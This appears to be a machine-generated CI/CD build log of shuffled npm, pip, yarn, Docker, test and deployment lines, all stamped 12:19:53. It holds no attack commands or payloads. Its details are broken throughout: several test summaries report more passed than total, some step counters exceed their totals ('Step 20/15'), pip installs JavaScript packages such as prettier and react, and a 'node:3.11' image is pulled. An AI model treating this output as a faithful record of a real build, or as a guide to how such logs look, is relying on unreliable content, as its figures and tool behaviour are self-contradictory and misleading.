74% branches\nnpm install: added 375 packages\nCompiling lib/app.ts...\n[12:19:53] WARN: Deprecated API usage\nDone.\n[12:19:53] WARN: Deprecated API usage\nPlatform: darwin-arm64\nBuilding Docker image...\n[12:19:53] DEBUG: Loading configuration\nCache restored successfully (405MB)\nConnecting to startup.dev:443...\nUsing Node.js 19.17.1\nStep 19/21: Building\n\u2713 Step 'setup' succeeded\nConnecting to example.com:443...\nImage pulled successfully\n[12:19:53] WARN: Deprecated API usage\nStep 16/15: Linting\nGenerating source maps...\nGenerating source maps...\nSuccess!\nWARNING: lodash has known vulnerabilities\n  PASS: integration/test_cache_hit.spec.js\nTLS handshake completed\nLoading...\nImage pulled successfully\nMinifying main.js\nCompleted.\n\u2713 test completed\nStep 5/25: Installing dependencies\n[12:19:53] ERROR: Connection failed\nCompleted.\n\u2717 build failed with exit code 9\nCache miss for key-5993\nGenerating source maps...\nArtifact uploaded: dist.zip (44MB)\nnpm notice: created a lockfile\nFetching submodules...\nCache restored successfully (39MB)\n\u2713 Step 'build' succeeded\nPlatform: linux-x64\nUsing Node.js 20.17.9\nOptimizing 55 modules...\nPlatform: linux-x64\npip install: Successfully installed prettier-3.12\nStep 11/24: Deploying\nArtifact downloaded: 22MB\nStep 16/20: Linting\nnpm notice: created a lockfile\nCompiling src/app.ts...\nPushing to registry...\nStep 15/23: Building\nTime: 65.557s\nyarn add: Done in 27.23s\nSuccess!\nUsing Python 3.11\nUploading artifact 'coverage' (19 files)\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] INFO: Starting build process\nLayer 10/10: COPY command\nGenerating source maps...\nChecking out main branch\n[12:19:53] DEBUG: Initializing service\n\u2713 lint completed\nCompiling src/handler.rs...\nBuilding Docker image...\nWARNING: react has known vulnerabilities\nRan 199 tests in 7s\nSuccess!\nnpm install: resolved 1361 packages\nCreating production build...\nSnapshots: 23 passed, 49 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=test\nCache hit for key-8557\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] WARN: Deprecated API usage\nGET /api - 200 (64ms)\nStep 16/24: Running migrations\npip: Installing build dependencies...\nStep 18/18: Deploying\n[12:19:53] DEBUG: Loading configuration\n\u2713 All checks passed\nPlatform: win32-x64\nEnvironment: test\nNODE_ENV=test\nDone.\nTLS handshake completed\nStep 3/23: Testing\nCache miss for key-8181\nUploading artifact 'dist' (36 files)\nNODE_ENV=test\nHEAD is now at 646edc8\nDone.\n[12:19:53] INFO: Connecting to database\nDone.\n\u2713 All checks passed\nConnection established\nDone.\nPOST /data - 200 (222ms)\n  PASS: e2e/test_user_create.spec.js\nTest Suites: 36 passed, 8 total\nHEAD is now at c094f7c\nConnection established\nImage pulled successfully\nyarn add: Done in 24.80s\n=== Step type_check completed ===\n=== Step: integration_tests ===\nVerifying...\nRan 187 tests in 55s\nTime: 105.716s\nFinished.\nHEAD is now at 5ebf51b\nPushing to registry...\nPulling image: python:3.11\nArtifact downloaded: 1MB\npip: Installing build dependencies...\n[12:19:53] INFO: Starting build process\n\u2717 build failed with exit code 54\nCompiling utils/index.js...\nFetching submodules...\nWARNING: jest has known vulnerabilities\npip install: Successfully installed react-3.1\nyarn add: Done in 27.28s\npip: Collecting lodash\nLayer 9/12: RUN command\n[12:19:53] DEBUG: Memory usage: 1604MB\nCache restored successfully (216MB)\nyarn add: Done in 5.21s\n\u2713 lint completed\nnpm install: resolved 1479 packages\nHEAD is now at 7dcdbee\nCreating production build...\nStep 11/19: Running migrations\nRan 47 tests in 58s\nEnvironment: test\nUploading artifact 'coverage' (37 files)\nOK\n[12:19:53] DEBUG: Initializing service\nArtifact uploaded: dist.zip (43MB)\nFinished.\n[12:19:53] DEBUG: Initializing service\nTransforming 889 files...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: added 407 packages\nnpm install: added 176 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: build\nSuccess!\nCache saved successfully\nFinished.\nnpm install: resolved 756 packages\nnpm install: resolved 1696 packages\nMinifying app.js\nStep 10/25: Deploying\nnpm install: added 138 packages\nCompiling components/service.java...\npip: Installing build dependencies...\nCreating production build...\n  PASS: e2e/test_db_connect.spec.js\nGenerating source maps...\nCompleted.\nFAILED: test_api_health\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'build' (28 files)\nReady.\nAlready up to date.\nImage pulled successfully\n  PASS: e2e/test_db_connect.spec.js\nTest Suites: 28 passed, 20 total\nWARNING: webpack has known vulnerabilities\nBuilding Docker image...\nPOST /api - 201 (74ms)\nOptimizing 88 modules...\n[12:19:53] WARN: Deprecated API usage\npip install: Successfully installed prettier-2.7\nStep 1/25: Installing dependencies\nDone.\nCreating production build...\nTest Suites: 16 passed, 7 total\n[12:19:53] WARN: Deprecated API usage\nException: TypeError\nLoading...\nStep 12/16: Linting\nPushing to registry...\nBuilding Docker image...\nGenerating source maps...\nCache restored successfully (78MB)\n[12:19:53] DEBUG: Connection pool: 12 active\nFAILED: test_api_health\nUploading artifact 'coverage' (7 files)\nGET /health - 204 (53ms)\nArtifact uploaded: build.tar.gz (7MB)\nCoverage: 83% statements, 69% branches\nHEAD is now at 4a70be6\nPlatform: darwin-arm64\nTime: 23.315s\nUploading artifact 'build' (12 files)\nPulling image: node:latest\nHEAD is now at aa7f5fd\n\u2713 Step 'setup' succeeded\nWARNING: lodash has known vulnerabilities\nUsing Node.js 17.15.8\n[12:19:53] INFO: Connecting to database\n[12:19:53] DEBUG: Loading configuration\nUsing Python 3.12\n[12:19:53] DEBUG: Loading configuration\nSwitched to branch 'feature/task-313'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 696 files...\nSnapshots: 32 passed, 42 total\nSuccess!\nUsing Node.js 16.14.8\nGET /health - 201 (15ms)\nReady.\nImage pulled successfully\nException: RuntimeError\nCache miss for key-4755\n\u2713 Task completed in 2573ms\nCompiling lib/utils.go...\npip: Installing build dependencies...\nUsing Node.js 20.12.10\n\u2713 All checks passed\nSwitched to branch 'bugfix/task-769'\nOK\nStep 11/16: Testing\nConnection established\npip install: Successfully installed eslint-5.11\nPushing to registry...\nVerifying...\nFetching submodules...\nTest Suites: 9 passed, 8 total\n[12:19:53] ERROR: Connection failed\nArtifact downloaded: 43MB\nWARNING: eslint has known vulnerabilities\nnpm notice: created a lockfile\nPushing to registry...\nSuccess!\nDone.\nPushing to registry...\nStep 1/15: Deploying\n\u2713 deploy completed\npip: Downloading lodash-4.6.tar.gz\nCompiling lib/index.js...\nPushing to registry...\nyarn add: Done in 26.3s\nStep 15/18: Installing dependencies\nOK\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (44MB)\nOK\nStep 4/22: Linting\nFetching submodules...\nUsing Python 3.10\nnpm notice: created a lockfile\n[12:19:53] WARN: Deprecated API usage\nPOST /upload - 202 (449ms)\npip install: Successfully installed lodash-1.8\nArtifact uploaded: build.tar.gz (2MB)\nFinished.\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nGET /health - 201 (87ms)\nVerifying...\nEnvironment: test\nConnecting to cloud.services:443...\nMinifying app.js\nInstalling react@4.15.1\nTime: 119.890s\npip: Downloading prettier-1.18.tar.gz\nNODE_ENV=test\nCache miss for key-4567\n[12:19:53] INFO: Starting build process\n[12:19:53] DEBUG: Query executed in 85ms\nTest Suites: 45 passed, 25 total\nWARNING: jest has known vulnerabilities\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\nMinifying main.js\nDone.\nArtifact uploaded: dist.zip (51MB)\n[12:19:53] INFO: Connecting to database\nNODE_ENV=development\n\u2713 All checks passed\nnpm install: resolved 1206 packages\nHEAD is now at 5af2df0\n\u2713 Task completed in 2387ms\nPlatform: linux-x64\n\u2713 lint completed\nGET /api - 204 (59ms)\nStep 6/21: Deploying\npip: Downloading express-5.10.tar.gz\nCompleted.\nCompiling lib/service.java...\nCache restored successfully (193MB)\nnpm install: resolved 108 packages\nConnection established\nConnecting to cloud.services:443...\nRan 162 tests in 46s\n[12:19:53] INFO: Request completed\n\u2713 build completed\nAlready up to date.\n[12:19:53] DEBUG: Memory usage: 1616MB\nArtifact downloaded: 18MB\nBundling styles.js\nStep 1/16: Testing\nArtifact uploaded: dist.zip (53MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:53] INFO: Connecting to database\nDone.\nStep 2/18: Testing\n[12:19:53] ERROR: Connection failed\nWaiting...\nOptimizing 47 modules...\n\u2717 build failed with exit code 115\nProcessing...\nUsing Node.js 17.11.4\nGenerating source maps...\nGenerating source maps...\nnpm notice: package.json updated\nStep 18/16: Building\n[12:19:53] INFO: Cache refreshed\nStep 7/25: Building\nConnecting to acme.corp:443...\nStep 5/17: Building\nEnvironment: production\npip: Installing build dependencies...\nCreating production build...\nyarn add: Done in 6.65s\n\u2713 Step 'setup' succeeded\nnpm install: resolved 1413 packages\n[12:19:53] DEBUG: Loading configuration\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: added 89 packages\nnpm install: resolved 620 packages\nCompiling utils/app.ts...\nTests: 75 passed, 265 total\nWARNING: lodash has known vulnerabilities\nnpm notice: package.json updated\nChecking out main branch\nImage pulled successfully\nGET /status - 200 (78ms)\nException: RuntimeError\nCompiling lib/utils.go...\nStep 1/21: Running migrations\nWARNING: prettier has known vulnerabilities\nOptimizing 24 modules...\nPlatform: win32-x64\nNODE_ENV=test\nStep 5/20: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\n  PASS: test_auth_login (31ms)\n\u2713 All checks passed\nUploading artifact 'coverage' (8 files)\n[12:19:53] ERROR: Connection failed\nException: ValueError\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'dist' (12 files)\nPushing to registry...\nCompiling src/service.java...\nUploading artifact 'build' (42 files)\nnpm install: resolved 459 packages\nNODE_ENV=test\n[12:19:53] DEBUG: Memory usage: 1011MB\n\u2713 deploy completed\nTest Suites: 22 passed, 47 total\nTest Suites: 26 passed, 31 total\nPulling image: alpine:latest\nStep 18/20: Deploying\nnpm install: resolved 961 packages\nCache miss for key-3190\n\u2713 Step 'setup' succeeded\nPulling image: alpine:3.11\nyarn add: Done in 27.90s\nBundling main.js\nChecking out main branch\nCoverage: 77% statements, 90% branches\npip: Downloading eslint-3.1.tar.gz\nChecking out main branch\nCache saved successfully\n[12:19:53] INFO: Starting build process\n[12:19:53] WARN: Deprecated API usage\nGET /health - 204 (21ms)\nUploading artifact 'coverage' (12 files)\nyarn add: Done in 16.25s\nTest Suites: 40 passed, 10 total\nStep 3/25: Deploying\nTime: 39.924s\nyarn add: Done in 3.4s\nWARNING: prettier has known vulnerabilities\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nEnvironment: production\nStep 9/23: Building\nStep 14/16: Testing\nTest Suites: 8 passed, 49 total\nTests: 359 passed, 431 total\nCompiling src/index.js...\nGenerating source maps...\nNODE_ENV=test\nnpm install: resolved 716 packages\nFetching submodules...\nCompiling src/main.py...\nStep 13/15: Deploying\nGenerating source maps...\n[12:19:53] DEBUG: Memory usage: 136MB\nConnection established\nDone.\nCache miss for key-6966\n[12:19:53] DEBUG: Query executed in 66ms\nNODE_ENV=development\nLayer 7/15: RUN command\nTransforming 504 files...\nLayer 4/14: RUN command\nHEAD is now at 3eca96f\nCompiling src/index.js...\nFetching submodules...\n[12:19:53] INFO: Request completed\nOK\nnpm notice: created a lockfile\nStep 20/15: Running migrations\n[12:19:53] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (47MB)\nCompiling components/handler.rs...\n[12:19:53] INFO: Cache refreshed\n  PASS: e2e/test_cache_hit.spec.js\nWaiting...\nLayer 4/12: RUN command\nSnapshots: 13 passed, 31 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 16.13.6\nnpm notice: package.json updated\n  PASS: test_db_connect (15ms)\nAlready up to date.\nImage pulled successfully\nInstalling prettier@4.19.4\nPlatform: win32-x64\nHEAD is now at b391194\n\u2713 Step 'install' succeeded\nStep 9/23: Installing dependencies\nLoading...\nSnapshots: 20 passed, 34 total\nCache hit for key-3775\n[12:19:53] INFO: Starting build process\nCompiling lib/service.java...\nEnvironment: test\nHEAD is now at e565404\nException: NullPointerException\nInstalling eslint@3.9.4\nUploading artifact 'build' (41 files)\nStep 14/22: Building\nCache saved successfully\nTest Suites: 47 passed, 13 total\nyarn add: Done in 9.55s\nCompiling src/index.js...\nUploading artifact 'build' (4 files)\npip: Downloading axios-4.16.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:53] DEBUG: Loading configuration\nOK\nTest Suites: 21 passed, 20 total\nTime: 38.602s\nCompiling components/handler.rs...\nReady.\nSwitched to branch 'hotfix/task-807'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTest Suites: 10 passed, 5 total\nPlatform: darwin-arm64\n[12:19:53] DEBUG: Connection pool: 9 active\nyarn add: Done in 24.29s\nOK\nStep 18/19: Building\nFAILED: test_user_create\nStep 4/15: Testing\nWARNING: react has known vulnerabilities\n[12:19:53] ERROR: Connection failed\nPlatform: darwin-arm64\nEnvironment: staging\n[12:19:53] DEBUG: Query executed in 1ms\nCompiling src/utils.go...\nLoading...\nVerifying...\n  PASS: unit/test_user_create.spec.js\nTransforming 573 files...\n[12:19:53] INFO: Request completed\nCompiling src/app.ts...\n\u2713 validate completed\nRan 112 tests in 45s\nTransforming 306 files...\nGET /api - 204 (42ms)\nnpm notice: created a lockfile\nBundling runtime.js\nMinifying main.js\nnpm notice: created a lockfile\nConnecting to example.com:443...\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nCache restored successfully (462MB)\npip install: Successfully installed eslint-3.13\nNODE_ENV=production\nFAILED: test_cache_hit\npip: Collecting jest\npip: Collecting prettier\n  PASS: e2e/test_auth_login.spec.js\n[12:19:53] DEBUG: Loading configuration\nCache saved successfully\nPulling image: node:3.11\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\n[12:19:53] INFO: Request completed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 8/24: Installing dependencies\nStep 16/15: Installing dependencies\nConnecting to cloud.services:443...\n[12:19:53] INFO: Cache refreshed\nCompleted.\nVerifying...\nMinifying app.js\nSwitched to branch 'bugfix/task-950'\nUploading artifact 'coverage' (26 files)\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\nReady.\nGenerating source maps...\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\n[12:19:53] DEBUG: Query executed in 35ms\nProcessing...\nGET /health - 201 (91ms)\nException: TypeError\nArtifact uploaded: build.tar.gz (39MB)\nCompleted.\n[12:19:53] ERROR: Connection failed\nnpm notice: package.json updated\nStep 3/21: Testing\n[12:19:53] DEBUG: Query executed in 35ms\n\u2713 Step 'checkout' succeeded\n\u2713 All checks passed\nUploading artifact 'coverage' (24 files)\npip: Installing build dependencies...\nTransforming 511 files...\n[12:19:53] ERROR: Connection failed\nnpm install: resolved 757 packages\nProcessing...\nException: NullPointerException\nBuilding Docker image...\nInstalling axios@2.6.10\n[12:19:53] DEBUG: Loading configuration\nCompleted.\n[12:19:53] INFO: Starting build process\n[12:19:53] DEBUG: Initializing service\nFetching submodules...\nArtifact uploaded: dist.zip (78MB)\nRan 97 tests in 7s\n\u2713 Step 'checkout' succeeded\nStep 5/23: Installing dependencies\nPlatform: darwin-arm64\nUsing Python 3.10\nDone.\n[12:19:53] DEBUG: Memory usage: 1009MB\nGenerating source maps...\nStep 2/15: Deploying\nHEAD is now at 435117a\nImage pulled successfully\nDone.\nReady.\npip install: Successfully installed jest-3.15\n[12:19:53] INFO: Processing request\nFAILED: test_cache_hit\nUsing Node.js 16.10.7\nTransforming 323 files...\n[12:19:53] DEBUG: Connection pool: 10 active\nTests: 54 passed, 146 total\n[12:19:53] WARN: Deprecated API usage\n[12:19:53] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nFetching submodules...\nNODE_ENV=development\n\u2717 build failed with exit code 79\nReady.\nnpm notice: package.json updated\n\u2713 build completed\n\u2713 build completed\nVerifying...\npip install: Successfully installed webpack-1.4\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nFAILED: test_cache_hit\nTests: 452 passed, 259 total\nRan 193 tests in 16s\n\u2713 Task completed in 2670ms\nOptimizing 48 modules...\nnpm notice: package.json updated\nCache invalidated: node_modules\nStep 16/17: Testing\nArtifact downloaded: 43MB\nReady.\nCompiling lib/main.py...\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nCache invalidated: dependencies\n[12:19:53] DEBUG: Memory usage: 1791MB\n[12:19:53] DEBUG: Memory usage: 2000MB\nWARNING: express has known vulnerabilities\nCreating production build...\nWARNING: jest has known vulnerabilities\nStep 18/24: Linting\nRan 52 tests in 6s\nFAILED: test_db_connect\nNODE_ENV=test\nOptimizing 48 modules...\nTime: 51.158s\nPushing to registry...\n[12:19:53] DEBUG: Query executed in 96ms\nCache miss for key-8524\n[12:19:53] DEBUG: Initializing service\nOptimizing 56 modules...\nTransforming 164 files...\nCache hit for key-8395\nFAILED: test_user_create\npip: Downloading eslint-5.18.tar.gz\nGET /api - 204 (85ms)\n\u2713 Step 'checkout' succeeded\nCompiling components/service.java...\nStep 5/24: Running migrations\n[12:19:53] DEBUG: Initializing service\nUploading artifact 'coverage' (50 files)\nEnvironment: test\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/15: Deploying\n[12:19:53] INFO: Starting build process\npip install: Successfully installed express-2.20\nBundling runtime.js\nyarn add: Done in 13.28s\n[12:19:53] INFO: Request completed\nArtifact downloaded: 47MB\nInstalling eslint@3.14.6\nCache saved successfully\nHEAD is now at 4c90892\nSnapshots: 28 passed, 26 total\nCreating production build...\nnpm install: added 374 packages\nCache miss for key-8839\nPlatform: win32-x64\nUsing Node.js 17.13.8\nPushing to registry...\n[12:19:53] INFO: Cache refreshed\npip: Collecting express\nPOST /data - 202 (326ms)\nStep 18/25: Linting\nCompiling src/handler.rs...\nChecking out master branch\nTLS handshake completed\nArtifact uploaded: dist.zip (84MB)\n[12:19:53] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nFetching submodules...\nGET /health - 204 (25ms)\nTransforming 484 files...\nStep 1/15: Installing dependencies\nUsing Python 3.10\n\u2713 All checks passed\nSwitched to branch 'bugfix/task-178'\nTest Suites: 15 passed, 30 total\nReady.\nProcessing...\nBuilding Docker image...\nCache miss for key-1651\nnpm install: resolved 1770 packages\nStep 5/23: Building\nnpm install: resolved 874 packages\nStep 2/18: Deploying\nLoading...\n\u2713 deploy completed\nVerifying...\nCoverage: 71% statements, 74% branches\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nOptimizing 86 modules...\nUploading artifact 'build' (37 files)\n\u2713 All checks passed\nOK\n\u2717 build failed with exit code 32\nException: RuntimeError\nPlatform: win32-x64\nCache hit for key-8476\n[12:19:53] DEBUG: Memory usage: 1266MB\nStep 10/23: Running migrations\nnpm install: added 352 packages\nTest Suites: 16 passed, 34 total\nConnecting to test.io:443...\npip: Collecting prettier\nEnvironment: test\nTime: 87.259s\n[12:19:53] INFO: Request completed\nRan 24 tests in 34s\n[12:19:53] INFO: Request completed\nCache invalidated: node_modules\nSwitched to branch 'bugfix/task-883'\nnpm install: resolved 320 packages\n[12:19:53] WARN: Deprecated API usage\nStep 13/18: Linting\nSnapshots: 20 passed, 1 total\nConnecting to test.io:443...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /health - 200 (14ms)\nnpm install: resolved 1264 packages\nTest Suites: 18 passed, 15 total\nProcessing...\n[12:19:53] DEBUG: Memory usage: 1143MB\nPlatform: win32-x64\nCoverage: 77% statements, 61% branches\nCompiling utils/app.ts...\nnpm install: added 339 packages\nAlready up to date.\n[12:19:53] INFO: Starting build process\n\u2713 All checks passed\nWARNING: webpack has known vulnerabilities\nEnvironment: development\nImage pulled successfully\n  PASS: test_user_create (252ms)\nStep 2/24: Installing dependencies\npip: Installing build dependencies...\npip: Downloading webpack-3.10.tar.gz\nPOST /upload - 201 (164ms)\n\u2713 All checks passed\nCompleted.\nCompiling utils/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 43\nCache restored successfully (381MB)\nUsing Python 3.10\n[12:19:53] DEBUG: Memory usage: 993MB\n\u2713 Step 'test' succeeded\n[12:19:53] WARN: Deprecated API usage\nFAILED: test_cache_hit\nStep 18/19: Testing\n[12:19:53] DEBUG: Memory usage: 775MB\nnpm install: added 82 packages\nPlatform: linux-x64\n[12:19:53] DEBUG: Initializing service\nWARNING: express has known vulnerabilities\nLayer 8/14: COPY command\nStep 9/17: Installing dependencies\nFinished.\nPlatform: linux-x64\nCache hit for key-1243\nStep 11/15: Deploying\nTests: 139 passed, 402 total\nGET /api - 200 (46ms)\nVerifying...\nStep 10/22: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: NullPointerException\nPlatform: linux-x64\n[12:19:53] DEBUG: Loading configuration\nTests: 294 passed, 335 total\nBuilding Docker image...\nTests: 170 passed, 450 total\nCompiling src/service.java...\n\u2713 Task completed in 2901ms\nGenerating source maps...\nStep 15/24: Linting\n[12:19:53] INFO: Cache refreshed\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\nTransforming 350 files...\nPushing to registry...\nArtifact uploaded: dist.zip (84MB)\nSwitched to branch 'hotfix/task-157'\nLoading...\nGenerating source maps...\n[12:19:53] DEBUG: Connection pool: 9 active\n[12:19:53] DEBUG: Memory usage: 543MB\nOK\n\u2713 Task completed in 4036ms\nCache restored successfully (282MB)\nLoading...\nOK\n  PASS: test_db_connect (147ms)\nCache miss for key-8459\n\u2713 Task completed in 1871ms\n\u2713 Task completed in 421ms\nProcessing...\nCache miss for key-2145\nStep 14/18: Deploying\nConnection established\nnpm install: added 228 packages\nChecking out develop branch\nSnapshots: 18 passed, 6 total\nCompiling utils/service.java...\nTime: 80.121s\nCompiling utils/main.py...\nReady.\nCreating production build...\nOK\npip: Collecting webpack\nPOST /data - 200 (209ms)\nBuilding Docker image...\nException: NullPointerException\n[12:19:53] WARN: Deprecated API usage\nCoverage: 98% statements, 78% branches\nAlready up to date.\nCache restored successfully (290MB)\nImage pulled successfully\nVerifying...\nRan 88 tests in 27s\nCompiling utils/app.ts...\nSwitched to branch 'feature/task-480'\nCompleted.\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] INFO: Cache refreshed\nCoverage: 97% statements, 89% branches\nStep 5/23: Installing dependencies\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting axios\nReady.\nCreating production build...\nHEAD is now at e037081\n[12:19:53] DEBUG: Loading configuration\nCreating production build...\nnpm install: resolved 780 packages\nImage pulled successfully\n  PASS: test_cache_hit (83ms)\n[12:19:53] DEBUG: Initializing service\n[12:19:53] DEBUG: Query executed in 79ms\nNODE_ENV=development\nFinished.\n[12:19:53] DEBUG: Connection pool: 13 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\npip: Collecting webpack\nLoading...\nStep 3/21: Deploying\n[12:19:53] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\n[12:19:53] INFO: Connecting to database\nStep 4/18: Running migrations\nSwitched to branch 'hotfix/task-481'\nCreating production build...\nDone.\n[12:19:53] DEBUG: Loading configuration\nNODE_ENV=test\nUploading artifact 'build' (6 files)\nPushing to registry...\nCompiling src/app.ts...\nWARNING: express has known vulnerabilities\nCache invalidated: build\nCache miss for key-7310\nFinished.\n  PASS: integration/test_db_connect.spec.js\nNODE_ENV=development\nCache hit for key-8898\nCache miss for key-9765\nProcessing...\nNODE_ENV=development\nHEAD is now at b10cb58\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nCompiling utils/app.ts...\n[12:19:53] DEBUG: Connection pool: 5 active\nVerifying...\nSwitched to branch 'hotfix/task-569'\nCompiling utils/main.py...\npip: Collecting express\nTest Suites: 49 passed, 39 total\nConnecting to test.io:443...\nStep 4/15: Deploying\nTest Suites: 8 passed, 32 total\n  PASS: unit/test_cache_hit.spec.js\n[12:19:53] DEBUG: Loading configuration\nVerifying...\nDone.\nStep 14/22: Installing dependencies\nConnecting to test.io:443...\nWARNING: webpack has known vulnerabilities\nTLS handshake completed\nConnection established\n[12:19:53] INFO: Starting build process\nCompiling utils/app.ts...\nnpm notice: package.json updated\nTLS handshake completed\n\u2713 Step 'install' succeeded\npip: Collecting express\n[12:19:53] DEBUG: Initializing service\nPOST /data - 201 (285ms)\n[12:19:53] DEBUG: Query executed in 38ms\n  PASS: test_auth_login (343ms)\nNODE_ENV=production\nCompiling components/service.java...\nConnection established\nNODE_ENV=test\n[12:19:53] WARN: Deprecated API usage\n\u2713 deploy completed\nArtifact uploaded: dist.zip (48MB)\nFinished.\nFAILED: test_api_health\nCache restored successfully (456MB)\n  PASS: test_api_health (436ms)\nUsing Node.js 17.13.2\nUsing Python 3.11\nRan 145 tests in 23s\n\u2713 Step 'build' succeeded\nPushing to registry...\n[12:19:53] WARN: Deprecated API usage\nConnection established\nGET /health - 200 (68ms)\nReady.\nCoverage: 91% statements, 99% branches\n[12:19:53] INFO: Connecting to database\n[12:19:53] INFO: Cache refreshed\n[12:19:53] INFO: Processing request\n[12:19:53] ERROR: Connection failed\nTests: 477 passed, 293 total\nDone.\nDone.\n[12:19:53] INFO: Request completed\nAlready up to date.\nUploading artifact 'dist' (6 files)\nCompiling src/main.py...\nyarn add: Done in 18.89s\npip: Downloading prettier-5.20.tar.gz\nnpm notice: package.json updated\n[12:19:53] DEBUG: Query executed in 21ms\nUsing Node.js 18.7.7\nStep 3/20: Building\nLoading...\n[12:19:53] DEBUG: Loading configuration\nStep 10/25: Testing\nChecking out main branch\n\u2713 Task completed in 4828ms\nWaiting...\nEnvironment: test\nUsing Python 3.9\n\u2713 Task completed in 3659ms\nCompiling src/app.ts...\nnpm notice: package.json updated\n[12:19:53] DEBUG: Memory usage: 1353MB\nCompiling src/main.py...\nnpm install: added 198 packages\n\u2717 build failed with exit code 96\n[12:19:53] DEBUG: Query executed in 24ms\nUploading artifact 'coverage' (10 files)\nChecking out develop branch\nFetching submodules...\nRan 171 tests in 8s\nArtifact uploaded: dist.zip (57MB)\nOptimizing 83 modules...\nException: RuntimeError\n[12:19:53] INFO: Processing request\nPushing to registry...\nImage pulled successfully\n[12:19:53] WARN: Deprecated API usage\n  PASS: test_user_create (29ms)\nWaiting...\nDone.\nCache restored successfully (58MB)\n  PASS: test_auth_login (66ms)\nMinifying app.js\nInstalling jest@2.17.9\n[12:19:53] DEBUG: Memory usage: 774MB\nVerifying...\n=== Step deploy_production completed ===\n=== Step: checkout ===\nSwitched to branch 'hotfix/task-909'\n[12:19:53] INFO: Cache refreshed\n  PASS: integration/test_auth_login.spec.js\n[12:19:53] DEBUG: Query executed in 47ms\n[12:19:53] DEBUG: Initializing service\nLayer 1/10: ENV command\nFinished.\npip: Downloading react-4.16.tar.gz\nBuilding Docker image...\nProcessing...\nOK\nHEAD is now at f26e82d\nPOST /api - 201 (200ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nLoading...\nSuccess!\n[12:19:53] WARN: Deprecated API usage\nDone.\nnpm notice: created a lockfile\nStep 1/24: Testing\nArtifact uploaded: dist.zip (9MB)\nEnvironment: staging\nTests: 131 passed, 252 total\nConnection established\nnpm install: added 256 packages\nCompiling src/handler.rs...\nnpm install: resolved 725 packages\nyarn add: Done in 25.27s\nUsing Python 3.10\n[12:19:53] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting jest\nOptimizing 47 modules...\nyarn add: Done in 19.92s\nPlatform: win32-x64\nnpm install: resolved 1205 packages\n\u2713 Task completed in 981ms\nFetching submodules...\nArtifact uploaded: build.tar.gz (4MB)\npip install: Successfully installed axios-1.3\npip install: Successfully installed jest-4.16\nCache restored successfully (307MB)\nCache invalidated: node_modules\n  PASS: test_user_create (279ms)\nTest Suites: 8 passed, 45 total\nVerifying...\nCompiling lib/service.java...\npip: Installing build dependencies...\n\u2713 Task completed in 4626ms\nFetching submodules...\nCache saved successfully\nCoverage: 81% statements, 69% branches\n[12:19:53] DEBUG: Loading configuration\nVerifying...\nProcessing...\nMinifying main.js\n  PASS: test_auth_login (458ms)\nDone.\n[12:19:53] INFO: Processing request\nSuccess!\n[12:19:53] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (35MB)\nGET /api - 204 (1ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: jest has known vulnerabilities\nStep 16/23: Testing\n[12:19:53] DEBUG: Memory usage: 1733MB\nLoading...\nPulling image: node:3.11\nCompiling lib/handler.rs...\nLoading...\nCompiling lib/service.java...\nPOST /upload - 201 (233ms)\nGET /api - 201 (98ms)\nVerifying...\nHEAD is now at ab92174\nUsing Node.js 20.13.9\nNODE_ENV=production\nGET /health - 204 (24ms)\nSuccess!\nTime: 109.185s\nBundling styles.css\nCache invalidated: build\nUsing Node.js 18.14.10\nCache restored successfully (84MB)\nDone.\nTransforming 876 files...\nCompiling src/app.ts...\nCache hit for key-9160\nyarn add: Done in 12.45s\nSuccess!\nGenerating source maps...\nChecking 